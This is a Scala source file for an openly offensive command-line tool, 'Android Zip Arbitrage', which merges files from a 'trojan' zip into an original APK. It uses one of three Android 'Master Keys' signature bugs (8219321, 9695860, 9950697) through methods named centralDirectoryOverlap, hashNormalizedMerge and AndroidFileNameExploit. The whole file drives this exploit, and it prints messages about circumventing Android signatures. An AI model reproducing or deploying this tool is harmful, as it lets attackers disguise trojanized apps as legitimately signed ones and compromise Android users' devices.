package android.zip.arbitrage

import java.io.File
import utils.{FileEntry, ZipFile}
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry
import scala.Some

case class Config(origAPK:Option[File] = None,
                  bug8219321:Boolean = false,
                  bug9695860:Boolean = false,
                  bug9950697:Boolean = true,
                  mergeZip:Option[File] = None,
                  out:Option[File] = None)

object Main extends App {

  val parser = new scopt.OptionParser[Config]("AndroidZipArbitrage") {
    head("Android Zip Arbitrage", "1.1")
    arg[File]("OriginalAPK") required() valueName("<file>") action { (x, c) =>
      c.copy(origAPK = Some(x)) } text("path to original APK")
    arg[File]("ModifiedAPK") valueName("<zipFile>") action { (x, c) =>
      c.copy(mergeZip = Some(x)) } text("Merge files from this zip into original APK")
    opt[File]('o', "out") valueName("<file>") action { (x, c) =>
      c.copy(out = Some(x)) } text("output APK path")
    opt[Unit]("8219321") optional() action {(x,c) => c.copy(bug8219321 = true)} text("Use bug 8219321 (uses 9950697 by default)")
    opt[Unit]("9695860") optional() action {(x,c) => c.copy(bug9695860 = true)} text("Use bug 9695860 (uses 9950697 by default)")
    help("help") text("prints this usage text")
  }

  parser.parse(args, Config()) map { config =>
    import utils.FileHelper._

   for {
     ogAPK     <- MasterKeysAPK(config.origAPK.get, original = true)
     trojanAPK <- MasterKeysAPK(config.mergeZip,  original = false)
   }{
     val outFilePath = config.out match {
       case Some(o) => o.getAbsolutePath
       case None =>   "MasterKeysModded-" +config.origAPK.get.getName
     }

     val fileBytes =
      if(config.bug9695860) {
        println("Using Bug 9695860 to circumvent Android signatures")
        ogAPK.centralDirectoryOverlap(trojanAPK).getZipFileBytes
      }
      else if(config.bug8219321) {
        println("Using Bug 8219321 to circumvent Android signatures")
        ogAPK.hashNormalizedMerge(trojanAPK).getZipFileBytes
      }
      else {
           println("Using Bug 9950697 to circumvent Android signatures")
           ogAPK.AndroidFileNameExploit(trojanAPK).getZipFileBytes
      }

     writeFile(outFilePath, fileBytes)
   }

  } getOrElse {
    // arguments are bad, usage message will have been displayed
  }

  def printZip(fileName:String){
    ZipFile(fileName) map { z =>
      val entries = z.map(_.zEntry.asInstanceOf[ZipArchiveEntry])
      entries.sortBy(_.getSize).map(e => println(s"${e.getName}\t${e.getSize}\t${e.getMethod}\t${e.getCrc}\t${e.getCompressedSize}"))
    }
  }

}
